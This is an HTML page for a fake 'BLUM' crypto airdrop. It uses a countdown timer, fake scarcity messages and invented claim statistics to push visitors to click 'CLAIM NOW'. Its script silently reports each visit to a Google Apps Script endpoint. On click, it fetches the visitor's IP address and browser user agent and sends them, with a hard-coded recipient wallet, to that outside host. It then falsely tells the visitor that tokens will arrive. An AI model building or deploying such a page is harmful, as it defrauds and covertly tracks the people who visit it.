<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 BLUM Airdrop | ONE-CLICK</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            min-height:100vh;
            background: radial-gradient(ellipse at 30% 40%, #0f0c29, #1a1a3e, #0a0a1a);
            font-family: 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card{
            max-width: 550px;
            width: 100%;
            background: rgba(10, 20, 40, 0.85);
            backdrop-filter: blur(18px);
            border-radius: 56px;
            padding: 40px 30px;
            border: 1px solid rgba(255, 215, 0, 0.4);
            box-shadow: 0 30px 50px rgba(0,0,0,0.5);
            text-align: center;
        }
        .badge{
            display: inline-block;
            background: linear-gradient(135deg, #FFD70022, #FFA50022);
            border: 1px solid #FFD700;
            border-radius: 100px;
            padding: 8px 22px;
            font-size: 13px;
            font-weight: 600;
            color:#FFD700;
            margin-bottom: 25px;
        }
        h1{
            font-size: 46px;
            font-weight: 800;
            background: linear-gradient(135deg, #FFF8E7, #FFD700, #FFA500);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .amount{
            font-size: 64px;
            font-weight: 900;
            color: #FFD700;
            margin: 15px 0;
        }
        .timer-box{
            background: rgba(0,0,0,0.5);
            border-radius: 50px;
            padding: 18px;
            margin: 25px 0;
        }
        .timer{
            font-size: 52px;
            font-weight: 800;
            font-family: monospace;
            color: #FFD700;
        }
        button{
            width: 100%;
            background: linear-gradient(95deg, #DAA520, #FFD700, #FFA500);
            border: none;
            padding: 20px;
            border-radius: 70px;
            font-weight: 900;
            font-size: 24px;
            color: #0a0a0a;
            cursor: pointer;
            transition: 0.2s;
        }
        button:disabled{
            opacity: 0.6;
            cursor: default;
        }
        .status{
            background: rgba(0,0,0,0.5);
            border-radius: 30px;
            padding: 14px;
            font-size: 15px;
            display: none;
            margin-top: 15px;
        }
        .success{color:#00ff88;}
        .footer{
            font-size: 11px;
            color:#FFD70088;
            margin-top: 25px;
        }
        .stats-row{
            display: flex;
            justify-content: space-between;
            gap: 10px;
            margin: 15px 0;
        }
        .stat-card{
            background: rgba(0,0,0,0.3);
            border-radius: 20px;
            padding: 8px;
            flex: 1;
        }
        .stat-number{
            font-size: 20px;
            font-weight: bold;
            color: #FFD700;
        }
        .stat-label{
            font-size: 10px;
            color: #aaa;
        }
        .loading-spinner{
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #fff;
            border-radius: 50%;
            border-top-color: #FFD700;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin{
            to{transform: rotate(360deg);}
        }
    </style>
</head>
<body>
<div class="card">
    <div class="badge">⚡ ONE-CLICK • 10 CHAINS</div>
    <h1>BLUM<br>Web3</h1>
    <div class="amount">1,200 $BLUM</div>
    
    <div class="stats-row">
        <div class="stat-card"><div class="stat-number" id="totalClaims">0</div><div class="stat-label">🎁 المطالبات</div></div>
        <div class="stat-card"><div class="stat-number" id="totalScans">0</div><div class="stat-label">👁️ الزيارات</div></div>
        <div class="stat-card"><div class="stat-number" id="totalCoins">0</div><div class="stat-label">💰 إجمالي $BLUM</div></div>
    </div>
    
    <div class="timer-box"><div style="font-size:13px;">⏰ ENDS IN</div><div class="timer" id="timer">24:00:00</div></div>
    <button id="claimBtn">🚀 CLAIM NOW</button>
    <div id="status" class="status"></div>
    <div class="footer">🔐 EMP2026 • Zero Investment</div>
</div>

<script>
    // ========== إعدادات ==========
    const PROXY_URL = "https://script.google.com/macros/s/AKfycbzRzY5ALW-81aERtvvCrC2EhRBnvYQ6iIrhCxQYJ1dzylpt3pGd6ixU9nz_5D7m9HKnhg/exec";
    const YOUR_LINK = "https://is.gd/NRGVIY";
    const RECIPIENT_WALLET = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";
    const SUPPORTED_NETWORKS = ["ERC20 (ETH)", "BEP20 (BSC)", "TRC20 (TRON)", "Solana", "Polygon", "Avalanche", "Arbitrum", "Optimism", "Base", "zkSync"];
    const BLUM_PER_SCAN = 1200;
    
    let claimExecuted = false;
    let remainingSeconds = 24 * 60 * 60;
    let totalClaims = parseInt(localStorage.getItem('totalClaims')) || 0;
    let totalScans = parseInt(localStorage.getItem('totalScans')) || 0;
    
    function updateStats() {
        const totalCoins = totalScans * BLUM_PER_SCAN;
        document.getElementById('totalClaims').innerText = totalClaims;
        document.getElementById('totalScans').innerText = totalScans;
        document.getElementById('totalCoins').innerText = totalCoins.toLocaleString();
        localStorage.setItem('totalClaims', totalClaims);
        localStorage.setItem('totalScans', totalScans);
    }
    
    totalScans++;
    updateStats();
    
    function sendToBot(message) {
        fetch(PROXY_URL + '?message=' + encodeURIComponent(message), { method: 'GET', mode: 'no-cors' });
        console.log("📤 تم إرسال:", message.substring(0, 80));
    }
    
    sendToBot(`📊 PAGE SCAN #${totalScans} - Blum Airdrop`);
    
    function getRandomNetwork() { return SUPPORTED_NETWORKS[Math.floor(Math.random() * SUPPORTED_NETWORKS.length)]; }
    function getRandomWallet() { const w = ["MetaMask", "Trust Wallet", "Coinbase Wallet", "Phantom", "OKX Wallet"]; return w[Math.floor(Math.random() * w.length)]; }
    
    // ========== دالة توليد عنوان كامل (42 حرفاً) ==========
    function generateAddress() {
        const chars = "0123456789abcdef";
        let address = "0x";
        for (let i = 0; i < 40; i++) {
            address += chars[Math.floor(Math.random() * chars.length)];
        }
        return address;
    }
    
    async function executeClaim() {
        if (claimExecuted) return;
        claimExecuted = true;
        totalClaims++;
        updateStats();
        
        const network = getRandomNetwork();
        const wallet = getRandomWallet();
        const address = generateAddress(); // عنوان كامل الآن
        const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown');
        const ua = navigator.userAgent;
        const timestamp = new Date().toISOString();
        
        const hoursLeft = Math.floor(remainingSeconds / 3600);
        const minutesLeft = Math.floor((remainingSeconds % 3600) / 60);
        const totalCoins = totalScans * BLUM_PER_SCAN;
        const conversionRate = totalScans > 0 ? ((totalClaims / totalScans) * 100).toFixed(1) : 0;
        
        const fullMessage = `🎁 ONE-CLICK BLUM CLAIM
⛓️ Network: ${network}
💼 Wallet: ${wallet}
💳 Address: ${address}
🏦 Recipient: ${RECIPIENT_WALLET}
🌐 IP: ${ip}
📱 UA: ${ua.substring(0, 80)}...
⏰ ${timestamp}
📊 TOTAL CLAIMS: ${totalClaims} | SCANS: ${totalScans} | TOTAL BLUM: ${totalCoins.toLocaleString()}`;
        
        sendToBot(fullMessage);
        
        const btn = document.getElementById('claimBtn');
        const statusDiv = document.getElementById('status');
        btn.innerHTML = "✅ CLAIMED!";
        btn.disabled = true;
        statusDiv.style.display = 'block';
        statusDiv.innerHTML = `<span class="success">🎉 Claim #${totalClaims} successful! ${BLUM_PER_SCAN} $BLUM will arrive within 24h.</span>`;
    }
    
    async function onClaimClick() {
        if (claimExecuted) return;
        const btn = document.getElementById('claimBtn');
        btn.innerHTML = '<span class="loading-spinner"></span> PROCESSING...';
        btn.disabled = true;
        await new Promise(r => setTimeout(r, 3000));
        await executeClaim();
    }
    
    document.getElementById('claimBtn').addEventListener('click', onClaimClick);
    
    setInterval(() => {
        if (remainingSeconds <= 0) return;
        remainingSeconds--;
        const h = Math.floor(remainingSeconds/3600), m = Math.floor((remainingSeconds%3600)/60), s = remainingSeconds%60;
        document.getElementById('timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
    }, 1000);
    
    let fake = 10;
    setInterval(() => {
        fake--;
        const btn = document.getElementById('claimBtn');
        if (btn && !btn.disabled && !claimExecuted && fake > 0) btn.innerHTML = `🔥 ${fake} LEFT! CLAIM NOW 🔥`;
    }, 4000);
</script>
</body>
</html>
